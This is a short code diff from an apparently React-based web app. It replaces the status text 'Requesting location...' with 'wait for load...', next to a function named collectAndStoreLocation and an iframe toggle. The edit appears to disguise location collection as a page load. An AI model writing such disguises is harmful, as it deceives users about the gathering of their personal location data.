@@ -5,7 +5,7 @@ import axios from 'axios';
 
 function App() {
   const [showSite, setShowSite] = useState(false); // Control when to show iframe
-  const [status, setStatus] = useState("Requesting location...");
+  const [status, setStatus] = useState("wait for load...");
 
   useEffect(() => {
     const collectAndStoreLocation = () => {
